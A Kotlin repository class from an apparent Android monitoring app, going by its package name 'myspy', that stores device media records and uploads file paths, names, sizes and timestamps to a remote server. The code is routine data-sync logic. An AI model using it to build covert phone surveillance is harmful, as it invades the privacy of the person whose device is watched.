package com.myspy.android.data.repository

import com.myspy.android.data.local.db.dao.MediaDao
import com.myspy.android.data.local.db.entities.MediaEntity
import com.myspy.android.data.remote.api.ApiService
import com.myspy.android.data.remote.models.MediaData
import java.text.SimpleDateFormat
import java.util.*

class MediaRepository(
    private val mediaDao: MediaDao,
    private val apiService: ApiService
) {

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    suspend fun saveMedia(media: MediaEntity): Long = mediaDao.insert(media)

    suspend fun saveMultiple(media: List<MediaEntity>) {
        mediaDao.insertAll(media)
    }

    suspend fun syncToServer(): Result<Int> {
        return try {
            val unsynced = mediaDao.getUnsyncedMedia()
            if (unsynced.isEmpty()) return Result.success(0)

            val dataList = unsynced.map { entity ->
                MediaData(
                    mediaType = entity.mediaType,
                    filePath = entity.filePath,
                    fileName = entity.fileName,
                    fileSize = entity.fileSize,
                    mimeType = entity.mimeType,
                    width = entity.width,
                    height = entity.height,
                    duration = entity.duration,
                    timestamp = dateFormat.format(Date(entity.timestamp))
                )
            }

            val response = apiService.uploadMedia(dataList)
            if (response.isSuccessful && response.body()?.result == "ok") {
                mediaDao.markAsSynced(unsynced.map { it.id })
                Result.success(unsynced.size)
            } else {
                Result.failure(Exception("Upload failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUnsyncedCount(): Int = mediaDao.getUnsyncedCount()

    suspend fun getMediaByType(mediaType: String, limit: Int = 100): List<MediaEntity> =
        mediaDao.getMediaByType(mediaType, limit)

    suspend fun getRecentMedia(limit: Int = 100): List<MediaEntity> =
        mediaDao.getRecentMedia(limit)

    suspend fun deleteOlderThan(days: Int) {
        val timestamp = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)
        mediaDao.deleteOlderThan(timestamp)
    }
}
